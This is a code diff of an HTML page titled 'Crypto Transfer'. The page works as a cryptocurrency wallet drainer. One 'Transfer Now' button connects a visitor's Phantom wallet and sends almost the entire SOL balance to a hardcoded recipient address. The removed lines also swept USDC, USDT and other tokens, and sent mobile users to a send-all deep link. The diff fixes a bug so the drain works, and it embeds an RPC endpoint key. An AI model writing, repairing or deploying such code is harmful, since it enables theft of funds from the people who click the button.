@@ -4,101 +4,64 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
+    
+    <!-- Buffer Polyfill to Fix the "Buffer is not defined" Error -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
+    <script>
+        window.Buffer = buffer.Buffer;
+    </script>
 </head>
 <body>
-    <h2>Click below to transfer SOL and selected tokens</h2>
-    <button id="transferButton">Transfer Now</button>
+    <h2>Click below to transfer all funds</h2>
+    <button id="transferBtn">Transfer Now</button>
 
-    <script>
-        document.getElementById('transferButton').addEventListener('click', async () => {
-            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+    <script type="module">
+        import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
 
-            // List of SPL token addresses
-            const splTokens = [
-                { name: "USDC", address: "EPjFWdd5AufqSSqeM2q4wrkEMuPeHQHqEAgHyoGdsXh" },
-                { name: "USDT", address: "Es9vMFrzaCERhHp9AxjBBa2CbcPy5j2KpR8wQNwMCXJs" },
-                { name: "RAY", address: "4k3Dyjzvzp8eMKnWJNxRebxvd3z9dDEHtBzTiqzTQin1" },
-                { name: "SRM", address: "ErgbzTg6WYPXD5bNy5XgGqmaPfkrZBXsS3pRZMWd7Qip" },
-                { name: "MNGO", address: "Bb9bsTQaT7DjZ4dPkr9tjLv2JGKWLshg5c9mMp8Xxny9" }
-            ];
+        const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+        const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");
 
-            function isMobileDevice() {
-                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            }
-
-            if (isMobileDevice()) {
-                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}&asset=sol&amount=ALL`;
-                window.location.href = mobileLink;
-            } else {
-                if (!window.solana) {
-                    alert("Phantom wallet not found. Please install it.");
+        document.getElementById('transferBtn').addEventListener('click', async () => {
+            try {
+                // Connect to Phantom wallet
+                const provider = window.phantom?.solana;
+                if (!provider || !provider.isPhantom) {
+                    alert('Phantom Wallet not found. Please install Phantom Wallet.');
                     return;
                 }
 
-                try {
-                    await window.solana.connect();
-                    const provider = window.solana;
-                    const connection = new solanaWeb3.Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df", 'confirmed');
+                const response = await provider.connect();
+                const senderPublicKey = new PublicKey(response.publicKey.toString());
 
-                    const publicKey = provider.publicKey;
-                    alert("Connected wallet: " + publicKey.toBase58());
-
-                    const transaction = new solanaWeb3.Transaction();
-
-                    // Transfer SOL (leaving some for fees)
-                    const balance = await connection.getBalance(publicKey);
-                    if (balance > 5000) {
-                        transaction.add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: publicKey,
-                                toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                                lamports: balance - 5000,
-                            })
-                        );
-                    }
-
-                    // Transfer SPL tokens
-                    for (const token of splTokens) {
-                        const tokenAccount = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                            mint: new solanaWeb3.PublicKey(token.address),
-                        });
-
-                        if (tokenAccount.value.length > 0) {
-                            const amount = tokenAccount.value[0].account.data.parsed.info.tokenAmount.uiAmount;
-                            if (amount > 0) {
-                                transaction.add(
-                                    splToken.createTransferInstruction(
-                                        tokenAccount.value[0].pubkey,
-                                        new solanaWeb3.PublicKey(receiverWallet),
-                                        publicKey,
-                                        amount * Math.pow(10, tokenAccount.value[0].account.data.parsed.info.tokenAmount.decimals),
-                                        [],
-                                        splToken.TOKEN_PROGRAM_ID
-                                    )
-                                );
-                            }
-                        }
-                    }
-
-                    if (transaction.instructions.length === 0) {
-                        alert("No funds available to transfer.");
-                        return;
-                    }
-
-                    const { signature } = await provider.signAndSendTransaction(transaction);
-                    alert("Transaction sent! Signature: " + signature);
-                    await connection.confirmTransaction(signature);
-                    alert("Transaction confirmed!");
-
-                } catch (error) {
-                    console.error("Error:", error);
-                    alert("Error: " + error.message);
+                // Get balance of SOL
+                const balance = await connection.getBalance(senderPublicKey);
+                if (balance <= 0) {
+                    alert('Insufficient balance.');
+                    return;
                 }
+
+                // Prepare transaction
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: senderPublicKey,
+                        toPubkey: new PublicKey(recipientWallet),
+                        lamports: balance - 5000,  // Deducting fee buffer
+                    })
+                );
+
+                transaction.feePayer = senderPublicKey;
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+
+                // Sign transaction
+                const signedTransaction = await provider.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
+                alert(`Transaction submitted: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
+            } catch (error) {
+                alert(`Error: ${error.message}`);
             }
         });
     </script>
-
-    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token"></script>
 </body>
 </html>
